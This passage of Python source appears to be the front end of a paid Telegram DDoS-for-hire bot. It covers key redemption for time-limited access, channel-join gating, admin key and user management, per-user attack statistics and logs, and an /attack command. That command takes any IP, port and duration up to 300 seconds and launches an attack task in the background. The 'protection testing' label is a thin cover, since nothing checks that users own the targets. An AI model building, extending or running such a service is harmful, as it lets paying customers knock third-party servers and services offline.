            f"   👤 `{log['user_id']}` (@{username}) • {fmt_ist(log['timestamp'])}"
        )
    
    text = f"📋 *RECENT ATTACK LOGS*\n\n" + "\n\n".join(lines)
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_mykeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            f"🔑 *VIEW USER KEYS*\n\n"
            f"Usage: `/mykeys <user_id>`\n\n"
            f"Example: `/mykeys 123456789`",
            parse_mode="Markdown"
        )
        return
    
    try:
        target_uid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ *Invalid User ID*", parse_mode="Markdown")
        return
    
    user = db.get_user(target_uid)
    if not user:
        await update.message.reply_text(f"❌ User `{target_uid}` not found.", parse_mode="Markdown")
        return
    
    redeemed_keys = user.get("redeemed_keys", [])
    if not redeemed_keys:
        await update.message.reply_text(
            f"👤 *User: {target_uid}*\n\n"
            f"📭 No keys redeemed yet.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    keys_text = "\n".join([f"• `{key}`" for key in redeemed_keys[-20:]])
    remaining = len(redeemed_keys) - 20 if len(redeemed_keys) > 20 else 0
    
    text = (
        f"👤 *USER KEYS*\n\n"
        f"User ID: `{target_uid}`\n"
        f"Keys Used: {len(redeemed_keys)}\n\n"
        f"*📋 Redeemed Keys:*\n{keys_text}"
    )
    if remaining > 0:
        text += f"\n\n... and {remaining} more"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

# ===== USER COMMANDS =====
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.username
    fname = update.effective_user.first_name or uname or str(uid)
    db.upsert_user(uid, uname, fname)
    
    welcome_text = (
        f"🌟 *WELCOME TO ATTACK BOT* 🌟\n\n"
        f"🔥 *Premium DDoS Protection Testing*\n"
        f"⚡ *High Performance Attack Simulation*\n"
        f"🛡️ *Professional Security Tool*\n\n"
        f"👋 *Hello {fname}!*\n\n"
        f"💡 *What I Can Do:*\n"
        f"• 🚀 Launch stress tests on IP:Port\n"
        f"• 📊 Real-time attack monitoring\n"
        f"• 🔑 Redeem keys for instant access\n"
        f"• 📈 Track your attack statistics\n"
        f"• ⚡ Lightning fast execution (Max 300s)\n\n"
    )
    
    if CHANNEL_ID and not await check_joined(uid, ctx):
        welcome_text += (
            f"📢 *REQUIREMENT:*\n"
            f"Please join our official channel first!\n\n"
            f"🔹 Tap **Join Channel** below\n"
            f"🔹 Then tap **Verified** to continue\n\n"
            f"✨ *Why join?* Get updates, support & exclusive keys!"
        )
        await update.message.reply_text(
            welcome_text,
            parse_mode="Markdown",
            reply_markup=join_keyboard(),
            disable_web_page_preview=True
        )
        return
    
    if db.is_approved(uid):
        u = db.get_user(uid)
        exp = u.get("expires_at")
        days = days_left(exp)
        redeemed_count = len(u.get("redeemed_keys", []))
        
        if days > 30:
            expiry_warning = "🟢 *Plenty of time left*"
        elif days > 7:
            expiry_warning = "🟡 *Access expires soon*"
        elif days > 0:
            expiry_warning = "🔴 *Access expiring soon!*"
        else:
            expiry_warning = "⚠️ *Access expired! Redeem a key!*"
        
        welcome_text += (
            f"✅ *ACCOUNT STATUS*\n"
            f"📅 Expires: {fmt_ist(exp)}\n"
            f"⏳ Days Left: {days} days\n"
            f"🎯 Attacks: {u.get('total_attacks', 0)}\n"
            f"🔑 Keys Used: {redeemed_count}\n\n"
            f"{expiry_warning}\n\n"
            f"🚀 *Ready to launch?*\n"
            f"`/attack <IP> <PORT> <SECONDS>` (Max 300s)\n\n"
            f"📊 *Limits:* Max 300 seconds | Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))[:40]}\n\n"
            f"💡 *Pro Tip:* You can stack multiple keys for extended access!"
        )
    else:
        welcome_text += (
            f"❌ *ACCOUNT INACTIVE*\n"
            f"Your account is not activated yet.\n"
            f"Use a redemption key to get started!\n\n"
            f"🔑 *Activation:*\n"
            f"`/redeem <YOUR-KEY-HERE>`\n\n"
            f"📨 *Need a key?* Contact admin using buttons below.\n\n"
            f"💡 *First time?* Redeem a key and start testing!"
        )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
        disable_web_page_preview=True
    )

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if CHANNEL_ID and not await check_joined(uid, ctx):
        await update.message.reply_text(
            "❌ *Channel Required*\n\nJoin our channel first using `/start`.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    if not ctx.args:
        await update.message.reply_text(
            f"🔑 *REDEEM KEY*\n\n"
            f"Usage: `/redeem <KEY>`\n\n"
            f"📝 *Example:*\n"
            f"`/redeem KEY-ABC123-24H-1U`\n\n"
            f"💡 *Benefits:*\n"
            f"• Activate your account instantly\n"
            f"• Stack multiple keys for more time\n"
            f"• Track all redeemed keys with `/myredeemed`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    key = ctx.args[0].strip()
    
    user = db.get_user(uid)
    if user and key in user.get("redeemed_keys", []):
        await update.message.reply_text(
            f"⚠️ *Key Already Used*\n\n"
            f"You've already redeemed this key\n\n"
            f"💡 You can redeem *different* keys to extend access.\n"
            f"📋 Use `/myredeemed` to see your keys.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    result = db.redeem_key(key, uid)
    if result["ok"]:
        h = result["hours"]
        exp = result["expires_at"]
        user = db.get_user(uid)
        redeemed_count = len(user.get("redeemed_keys", []))
        
        await update.message.reply_text(
            f"🎉 *KEY REDEEMED SUCCESSFULLY* 🎉\n\n"
            f"⏱️ Added: {h}h ({h/24:.1f} days)\n"
            f"📅 New Expiry: {fmt_ist(exp)}\n"
            f"⏳ Days Left: {days_left(exp)} days\n"
            f"🔑 Total Keys: {redeemed_count}\n\n"
            f"✅ *Account Active!*\n"
            f"🚀 Start attacking: `/attack <IP> <PORT> <SECONDS>` (Max 300s)\n\n"
            f"💡 *Pro Tip:* Redeem more keys to extend further!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ *REDEMPTION FAILED*\n\n"
            f"{result['err']}",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )

async def cmd_myinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u = db.get_user(uid)
    if not u:
        await update.message.reply_text("❌ Not registered. Use `/start`.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    exp = u.get("expires_at")
    days = days_left(exp)
    status = "🟢 Active" if db.is_approved(uid) else "🔴 Inactive"
    if db.is_approved(uid) and days <= 3:
        status = "🟡 Expiring Soon"
    
    ch = "✅ Joined" if u.get("joined_channel") else "❌ Not joined"
    redeemed_count = len(u.get("redeemed_keys", []))
    
    text = (
        f"ℹ️ *ACCOUNT INFORMATION*\n\n"
        f"👤 User ID: `{uid}`\n"
        f"📌 Status: {status}\n"
        f"🎯 Attacks: {u.get('total_attacks', 0)}\n"
        f"🔑 Keys Used: {redeemed_count}\n"
        f"📅 Expires: {fmt_ist(exp)}\n"
        f"⏳ Days Left: {days} days\n"
        f"📢 Channel: {ch}"
    )
    
    if db.is_approved(uid) and days <= 7:
        text += f"\n\n⚠️ *Reminder:* Your access expires in {days} days! Redeem a key to extend."
    elif not db.is_approved(uid):
        text += f"\n\n🔑 *Need access?* Use `/redeem` with a valid key."
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cmd_myredeemed(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = db.get_user(uid)
    
    if not user:
        await update.message.reply_text("❌ Not registered. Use `/start`.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    redeemed_keys = user.get("redeemed_keys", [])
    if not redeemed_keys:
        await update.message.reply_text(
            f"📭 *No Redeemed Keys*\n\n"
            f"You haven't redeemed any keys yet.\n\n"
            f"🔑 Use `/redeem <KEY>` to activate your account.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    recent_keys = redeemed_keys[-15:]
    keys_text = "\n".join([f"• `{key}`" for key in recent_keys])
    remaining = len(redeemed_keys) - 15 if len(redeemed_keys) > 15 else 0
    
    text = (
        f"🔑 *YOUR REDEEMED KEYS*\n\n"
        f"📊 Total Keys: {len(redeemed_keys)}\n\n"
        f"*📋 Recent Keys:*\n{keys_text}"
    )
    if remaining > 0:
        text += f"\n\n... and {remaining} more"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cmd_mystats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not db.is_approved(uid):
        await update.message.reply_text("❌ Account not active. Use `/redeem`.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    s = db.user_stats(uid)
    rate = (s["success"] / s["total"] * 100) if s["total"] > 0 else 0
    
    text = (
        f"📊 *YOUR ATTACK STATISTICS*\n\n"
        f"🎯 Total Attacks: {s['total']}\n"
        f"✅ Successful: {s['success']}\n"
        f"❌ Failed: {s['failed']}\n"
        f"📈 Success Rate: {rate:.1f}%\n"
    )
    
    if s["recent"]:
        text += "\n*📋 Recent Attacks:*\n"
        for a in s["recent"]:
            icon = "✅" if a["status"] == "success" else "❌"
            ip_parts = a["ip"].split('.')
            masked_ip = f"{ip_parts[0]}.{ip_parts[1]}.xxx.xxx" if len(ip_parts) == 4 else a["ip"]
            text += f"{icon} `{masked_ip}:{a['port']}` — {a['duration']}s\n"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    
    if CHANNEL_ID and not await check_joined(uid, ctx):
        await update.message.reply_text(
            "❌ *Channel Required*\n\nJoin our channel first using `/start`.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    if not db.is_approved(uid):
        await update.message.reply_text(
            f"❌ *ACCOUNT INACTIVE*\n\n"
            f"Your account is not activated.\n\n"
            f"🔑 Use `/redeem <KEY>` to activate.\n"
            f"📨 Contact admin if you need a key.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    if uid in active_attacks and active_attacks[uid]["end"] > time.time():
        remaining = int(active_attacks[uid]["end"] - time.time())
        minutes = remaining // 60
        seconds = remaining % 60
        time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
        await update.message.reply_text(
            f"⏳ *ATTACK IN PROGRESS*\n\n"
            f"You have an active attack!\n"
            f"⏱️ Time Left: `{time_str}`\n\n"
            f"Please wait for it to complete before starting a new attack.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    if len(ctx.args) != 3:
        blocked = ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
        await update.message.reply_text(
            f"🚀 *ATTACK COMMAND*\n\n"
            f"Usage: `/attack <IP> <PORT> <SECONDS>`\n\n"
            f"📝 *Example:*\n"
            f"`/attack 1.2.3.4 80 300`\n\n"
            f"⚠️ *Limits:*\n"
            f"• Max duration: 300 seconds\n"
            f"• Blocked ports: {blocked}\n\n"
            f"💡 Real-time progress will be shown!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    ip = ctx.args[0]
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ *Invalid IP Address*\n\nPlease provide a valid IPv4 address.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    parts = ip.split('.')
    for part in parts:
        if int(part) > 255:
            await update.message.reply_text("❌ *Invalid IP*\n\nEach octet must be 0-255.", parse_mode="Markdown", reply_markup=get_support_keyboard())
            return
    
    try:
        port = int(ctx.args[1])
        if not (1 <= port <= 65535):
            raise ValueError
    except:
        await update.message.reply_text("❌ *Invalid Port*\n\nPort must be between 1 and 65535.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"❌ *Port Blocked*\n\nPort {port} is not allowed for security reasons.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    try:
        dur = int(ctx.args[2])
        if not (1 <= dur <= 300):
            raise ValueError
    except:
        await update.message.reply_text("❌ *Invalid Duration*\n\nDuration must be 1-300 seconds.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return

    msg = await update.message.reply_text(
        f"🚀 *INITIATING ATTACK* 🚀\n\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱️ Duration: `{dur}s`\n"
        f"🔄 *Starting attack...*\n"
        f"✨ *Bot remains responsive!*\n"
        f"💡 You can use other commands while this runs!",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )
    
    asyncio.create_task(run_attack(update, ctx, uid, ip, port, dur, msg))

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS
    approved = db.is_approved(uid)
    
    text = (
        f"🆘 *HELP & COMMANDS*\n\n"
        f"🔰 *BASIC COMMANDS*\n"
        f"`/start` - Welcome & status\n"
        f"`/help` - This menu\n"
        f"`/myinfo` - Account details\n"
        f"`/myredeemed` - Your keys\n"
        f"`/redeem` - Activate account\n"
    )
    
    if approved:
        text += (
            f"\n⚔️ *ATTACK COMMANDS*\n"
            f"`/attack IP PORT SEC` - Launch (Max 300s)\n"
            f"`/mystats` - Your attack stats\n"
        )
    
    if is_admin:
        text += (
            f"\n👑 *ADMIN COMMANDS*\n"
            f"`/genkey` - Create key\n"
            f"`/keys` - List all keys\n"
            f"`/delkey` - Delete key\n"
            f"`/delkeyall` - DELETE ALL keys\n"
            f"`/users` - List users\n"
            f"`/broadcast` - Announcement\n"
            f"`/stats` - Bot statistics\n"
            f"`/curlip` - Active attacks\n"
            f"`/logs` - Attack history\n"
        )
    
    text += f"\n💬 *Support:* Use buttons below for help."
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

# ===== CALLBACK HANDLERS =====
async def menu_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    
    if query.data == "menu_attack":
        await query.message.reply_text(
            f"🚀 *ATTACK COMMAND*\n\n"
            f"Usage: `/attack <IP> <PORT> <SECONDS>`\n\n"
            f"📝 *Example:*\n"
            f"`/attack 1.2.3.4 80 60`\n\n"
            f"⚠️ *Limits:*\n"
            f"• Max duration: 300 seconds\n"
            f"• Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}\n\n"
            f"💡 *Tip:* You can use other commands while attack runs!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    
    elif query.data == "menu_stats":
        if not db.is_approved(uid):
            await query.message.reply_text("❌ Account not active. Use `/redeem` first.", parse_mode="Markdown")
            return
        s = db.user_stats(uid)
        rate = (s["success"] / s["total"] * 100) if s["total"] > 0 else 0
        text = (
            f"📊 *YOUR STATISTICS*\n\n"
            f"🎯 Total Attacks: `{s['total']}`\n"
            f"✅ Successful: `{s['success']}`\n"
            f"❌ Failed: `{s['failed']}`\n"
            f"📈 Success Rate: `{rate:.1f}%`\n"
        )
        if s["recent"]:
            text += "\n*📋 Recent Attacks:*\n"
            for a in s["recent"][:3]:
                icon = "✅" if a["status"] == "success" else "❌"
                text += f"{icon} `{a['ip']}:{a['port']}` — {a['duration']}s\n"
        await query.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())
    
    elif query.data == "menu_redeem":
        await query.message.reply_text(
            f"🔑 *REDEEM KEY*\n\n"
            f"Usage: `/redeem <KEY>`\n\n"
            f"📝 *Example:*\n"
            f"`/redeem KEY-ABC123-24H-1U`\n\n"
            f"💡 *Benefits:*\n"
            f"• Activate your account\n"
            f"• Extend existing access\n"
            f"• Multiple keys stack!\n\n"
            f"📨 Contact admin to purchase keys.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    
    elif query.data == "menu_info":
        u = db.get_user(uid)
        if not u:
            await query.message.reply_text("❌ Use /start first.", parse_mode="Markdown")
            return
        exp = u.get("expires_at")
        status = "🟢 Active" if db.is_approved(uid) else "🔴 Inactive"
        text = (
            f"ℹ️ *ACCOUNT INFORMATION*\n\n"
            f"👤 ID: `{uid}`\n"
            f"📌 Status: {status}\n"
            f"🎯 Attacks: {u.get('total_attacks', 0)}\n"
            f"🔑 Keys Used: {len(u.get('redeemed_keys', []))}\n"
            f"📅 Expires: {fmt_ist(exp)}\n"
            f"⏳ Days Left: {days_left(exp)} days\n"
        )
        await query.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())
    
    elif query.data == "menu_help":
        await cmd_help(update, ctx)

async def cb_verify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    
    if await check_joined(uid, ctx):
        try:
            await query.edit_message_text(
                f"✅ *VERIFICATION SUCCESSFUL*\n\n"
                f"You have joined the channel!\n"
                f"Use `/start` to continue.",
                parse_mode="Markdown"
            )
        except Exception:
            await query.message.reply_text(
                f"✅ *VERIFICATION SUCCESSFUL*\n\n"
                f"You have joined the channel!\n"
                f"Use `/start` to continue.",
                parse_mode="Markdown"
            )
        finally:
            await query.answer("✅ Verified successfully!")
    else:
        try:
            await query.edit_message_text(
                f"❌ *VERIFICATION FAILED*\n\n"
                f"You haven't joined the channel yet!\n\n"
                f"Please join first, then tap **Verified** again.",
                parse_mode="Markdown",
                reply_markup=join_keyboard()
            )
        except Exception:
            await query.message.reply_text(
                f"❌ *VERIFICATION FAILED*\n\n"
                f"You haven't joined the channel yet!\n\n"
                f"Please join first, then tap **Verified** again.",
                parse_mode="Markdown",
                reply_markup=join_keyboard()
            )
        finally:
            await query.answer("❌ Please join the channel first!", show_alert=True)

async def cb_confirm_delall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_delall":
        count = db.delete_all_keys()
        await query.edit_message_text(
            f"✅ *ALL KEYS DELETED*\n\n"
            f"🗑️ Removed: {count} keys\n\n"
            f"ℹ️ *Important:*\n"
            f"• User accounts remain ACTIVE\n"
            f"• No new keys can be redeemed\n"
            f"• Use `/genkey` to create new keys",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await query.edit_message_text(
            f"❌ *OPERATION CANCELLED*\n\n"
            f"No keys were deleted.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )

async def err_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {ctx.error}")

# ===== MAIN =====
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Admin commands
    app.add_handler(CommandHandler("genkey",         cmd_genkey))
    app.add_handler(CommandHandler("keys",           cmd_keys))
    app.add_handler(CommandHandler("delkey",         cmd_delkey))
    app.add_handler(CommandHandler("delkeyall",      cmd_delkeyall))
    app.add_handler(CommandHandler("delusedkeys",    cmd_delusedkeys))
    app.add_handler(CommandHandler("delunusedkeys",  cmd_delunusedkeys))
    app.add_handler(CommandHandler("delkeysbyhours", cmd_delkeysbyhours))
    app.add_handler(CommandHandler("users",          cmd_users))
    app.add_handler(CommandHandler("mykeys",         cmd_mykeys))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CommandHandler("stats",          cmd_stats))
    app.add_handler(CommandHandler("curlip",         cmd_curlip))
    app.add_handler(CommandHandler("serverip",       cmd_serverip))
    app.add_handler(CommandHandler("logs",           cmd_logs))
    
    # User commands
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("redeem",         cmd_redeem))
    app.add_handler(CommandHandler("attack",         cmd_attack))
    app.add_handler(CommandHandler("myinfo",         cmd_myinfo))
    app.add_handler(CommandHandler("myredeemed",     cmd_myredeemed))
    app.add_handler(CommandHandler("mystats",        cmd_mystats))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(cb_verify, pattern="^verify_join$"))
    app.add_handler(CallbackQueryHandler(cb_confirm_delall, pattern="^(confirm_delall|cancel_delall)$"))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu_"))
    
    app.add_error_handler(err_handler)
    
    try:
        server_ip = requests.get("https://api.ipify.org?format=json", timeout=5).json().get("ip", "Unknown")
    except:
        server_ip = "Unknown"
    
    print("=" * 60)
    print("🌟  ATTACK BOT - FIREBASE REALTIME DB VERSION")
    print("=" * 60)
    print(f"🤖  Bot Status    : RUNNING")
    print(f"🌐  Server IP     : {server_ip}")
    print(f"👑  Admins        : {ADMIN_IDS}")
    print(f"📢  Channel       : {CHANNEL_ID} ({CHANNEL_USERNAME})")
    print(f"🚫  Blocked Ports : {sorted(BLOCKED_PORTS)}")
    print("=" * 60)
    print(f"✅  Database      : Firebase Realtime DB")
    print(f"✅  Max Duration  : 300 seconds (5 minutes)")
    print(f"✅  Multiple Keys : ENABLED (stackable)")
    print(f"✅  Real-time UI  : ENABLED (live progress)")
    print(f"✅  Menu System   : ENABLED")
    print("=" * 60)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
